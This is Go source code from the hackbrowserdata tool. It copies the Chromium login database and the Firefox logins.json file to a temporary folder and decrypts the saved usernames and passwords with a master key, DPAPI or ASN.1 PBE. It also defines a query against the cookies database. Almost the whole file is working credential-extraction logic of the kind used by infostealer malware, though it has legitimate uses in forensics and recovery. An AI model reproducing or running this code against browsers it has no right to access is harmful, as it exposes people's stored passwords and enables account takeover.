package browserdata

import (
	"database/sql"
	"encoding/base64"
	"os"
	"path/filepath"
	"time"

	// import go-sqlite3 driver
	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"

	"github.com/moond4rk/hackbrowserdata/crypto"
	"github.com/moond4rk/hackbrowserdata/log"
	"github.com/moond4rk/hackbrowserdata/utils/fileutil"
	"github.com/moond4rk/hackbrowserdata/utils/typeutil"
)

type PasswordExtractor struct {
	masterKey        []byte
	datafiles        []string
	extractorHandler ExtractorHandler
	rowsHandler      RowsHandler
}

type Password struct {
	Profile     string
	Username    string
	Password    string
	encryptPass []byte
	encryptUser []byte
	LoginURL    string
	CreateDate  time.Time
}

func NewPassExtractor(masterKey []byte, datafiles []string, fileHandler ExtractorHandler, rowsHandler RowsHandler) *PasswordExtractor {
	return &PasswordExtractor{
		masterKey:        masterKey,
		datafiles:        datafiles,
		extractorHandler: fileHandler,
		rowsHandler:      rowsHandler,
	}
}

func (d *PasswordExtractor) Extract() (interface{}, error) {
	var passwords []Password
	var err error
	for _, datafile := range d.datafiles {
		data, err := d.extractorHandler(d.masterKey, datafile, queryChromiumLogin, d.rowsHandler)
		if err != nil {
			log.Error(err)
			continue
		}
		passwords = append(passwords, data.([]Password)...)
	}
	return passwords, err
}

func ChromiumPassRowsHandler(masterKey []byte, rows interface{}) (interface{}, error) {
	sqlRows := rows.(*sql.Rows)
	var passwords []Password
	for sqlRows.Next() {
		var (
			url, username         string
			encryptPass, password []byte
			create                int64
			err                   error
		)
		if err := sqlRows.Scan(&url, &username, &encryptPass, &create); err != nil {
			log.Warn(err)
			continue
		}
		pass := Password{
			// Profile:     filepath.Base(profile),
			Username:    username,
			encryptPass: encryptPass,
			LoginURL:    url,
		}
		if len(encryptPass) > 0 {
			if len(masterKey) == 0 {
				password, err = crypto.DPAPI(encryptPass)
			} else {
				password, err = crypto.DecryptPass(masterKey, encryptPass)
			}
			if err != nil {
				log.Error(err)
			}
		}
		if create > time.Now().Unix() {
			pass.CreateDate = typeutil.TimeEpoch(create)
		} else {
			pass.CreateDate = typeutil.TimeStamp(create)
		}
		pass.Password = string(password)
		passwords = append(passwords, pass)
	}
	return passwords, nil
}

func FirefoxPassRowsHandler(masterKey []byte, rows interface{}) (interface{}, error) {
	var passwords []Password

	jsonBytes := rows.([]byte)
	jsonRows := gjson.GetBytes(jsonBytes, "logins").Array()

	if len(jsonRows) == 0 {
		return nil, nil
	}

	for _, v := range jsonRows {
		var (
			p           Password
			encryptUser []byte
			encryptPass []byte
			err         error
		)
		p.LoginURL = v.Get("formSubmitURL").String()
		encryptUser, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
		if err != nil {
			return nil, err
		}
		encryptPass, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
		if err != nil {
			return nil, err
		}
		p.encryptUser = encryptUser
		p.encryptPass = encryptPass
		// TODO: handle error
		userPBE, err := crypto.NewASN1PBE(p.encryptUser)
		if err != nil {
			return nil, err
		}
		pwdPBE, err := crypto.NewASN1PBE(p.encryptPass)
		if err != nil {
			return nil, err
		}
		username, err := userPBE.Decrypt(masterKey)
		if err != nil {
			return nil, err
		}
		password, err := pwdPBE.Decrypt(masterKey)
		if err != nil {
			return nil, err
		}
		p.Password = string(password)
		p.Username = string(username)
		p.CreateDate = typeutil.TimeStamp(v.Get("timeCreated").Int() / 1000)
		passwords = append(passwords, p)
	}
	return passwords, nil
}

func (d *PasswordExtractor) ExtractChromium() (interface{}, error) {
	var passwords []Password
	var err error
	for _, datafile := range d.datafiles {
		data, err := DefaultDBHandler(d.masterKey, datafile, queryChromiumLogin, d.rowsHandler)
		if err != nil {
			log.Error(err)
			continue
		}
		passwords = append(passwords, data.([]Password)...)
	}
	return passwords, err
}

func (d *PasswordExtractor) ExtractFirefox() (interface{}, error) {
	return nil, nil
}

func Export(masterKey []byte, passwordPath string) ([]Password, error) {
	tempPassFile := filepath.Join(os.TempDir(), filepath.Base(passwordPath))
	if err := fileutil.CopyFile(passwordPath, tempPassFile); err != nil {
		return nil, err
	}
	defer os.Remove(tempPassFile)
	passwords, err := exportPasswords(masterKey, "", tempPassFile)
	if err != nil {
		return nil, err
	}
	return passwords, err
}

const (
	queryChromiumLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`
)

func exportPasswords(masterKey []byte, profile, passFile string) ([]Password, error) {
	db, err := sql.Open("sqlite3", passFile)
	if err != nil {
		return nil, err
	}
	defer db.Close()
	rows, err := db.Query(queryChromiumLogin)
	if err != nil {
		return nil, err
	}
	var passwords []Password
	for rows.Next() {
		var (
			url, username         string
			encryptPass, password []byte
			create                int64
		)
		if err := rows.Scan(&url, &username, &encryptPass, &create); err != nil {
			log.Warn(err)
		}
		pass := Password{
			Profile:     filepath.Base(profile),
			Username:    username,
			encryptPass: encryptPass,
			LoginURL:    url,
		}
		if len(encryptPass) > 0 {
			if len(masterKey) == 0 {
				password, err = crypto.DPAPI(encryptPass)
			} else {
				password, err = crypto.DecryptPass(masterKey, encryptPass)
			}
			if err != nil {
				log.Error(err)
			}
		}
		if create > time.Now().Unix() {
			pass.CreateDate = typeutil.TimeEpoch(create)
		} else {
			pass.CreateDate = typeutil.TimeStamp(create)
		}
		pass.Password = string(password)
		passwords = append(passwords, pass)
	}
	return passwords, nil
}

const (
	queryChromiumCookie = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`
)

func ExportPasswords(masterKey []byte, passwordPath string) ([]Password, error) {
	tempPassFile := filepath.Join(os.TempDir(), filepath.Base(passwordPath))
	if err := fileutil.CopyFile(passwordPath, tempPassFile); err != nil {
		return nil, err
	}
	defer os.Remove(tempPassFile)
	passwords, err := exportFirefoxPasswords(masterKey, "", tempPassFile)
	if err != nil {
		return nil, err
	}
	return passwords, err
}

func exportFirefoxPasswords(masterKey []byte, profile, passFile string) ([]Password, error) {
	s, err := os.ReadFile(passFile)
	if err != nil {
		return nil, err
	}
	defer os.Remove(passFile)
	loginsJSON := gjson.GetBytes(s, "logins")
	var passwords []Password
	if !loginsJSON.Exists() {
		return nil, err
	}

	for _, v := range loginsJSON.Array() {
		var (
			p           Password
			encryptUser []byte
			encryptPass []byte
		)
		p.LoginURL = v.Get("formSubmitURL").String()
		encryptUser, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
		if err != nil {
			return nil, err
		}
		encryptPass, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
		if err != nil {
			return nil, err
		}
		p.encryptUser = encryptUser
		p.encryptPass = encryptPass
		// TODO: handle error
		userPBE, err := crypto.NewASN1PBE(p.encryptUser)
		if err != nil {
			return nil, err
		}
		pwdPBE, err := crypto.NewASN1PBE(p.encryptPass)
		if err != nil {
			return nil, err
		}
		username, err := userPBE.Decrypt(masterKey)
		if err != nil {
			return nil, err
		}
		password, err := pwdPBE.Decrypt(masterKey)
		if err != nil {
			return nil, err
		}
		p.Password = string(password)
		p.Username = string(username)
		p.Profile = profile
		p.CreateDate = typeutil.TimeStamp(v.Get("timeCreated").Int() / 1000)
		passwords = append(passwords, p)
	}
	return passwords, nil
}
